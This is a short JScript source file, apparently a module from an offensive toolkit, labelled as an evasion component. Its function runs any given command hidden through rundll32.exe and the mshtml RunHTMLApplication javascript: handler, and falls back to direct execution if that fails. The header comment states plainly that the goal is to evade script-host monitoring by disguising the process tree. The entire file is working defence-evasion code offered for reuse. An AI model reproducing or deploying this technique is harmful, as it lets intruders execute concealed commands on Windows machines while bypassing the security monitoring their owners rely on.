// chunk: evasion/lolbin_rundll32
// depends: (none)
// provides: exec_via_rundll32
// format: jscript
// note: Executes JScript code via rundll32.exe mshtml RunHTMLApplication
//       protocol handler. Process tree shows rundll32 as parent, evading
//       script host monitoring rules.

function exec_via_rundll32(cmd) {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var jsPayload = 'new ActiveXObject("WScript.Shell").Run("' +
            cmd.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '",0,false);close();';
        var rundllCmd = 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";' + jsPayload;
        sh.Run(rundllCmd, 0, false);
    } catch(e) {
        /* Fallback: direct execution */
        var sh2 = new ActiveXObject("WScript.Shell");
        sh2.Run(cmd, 0, false);
    }
}
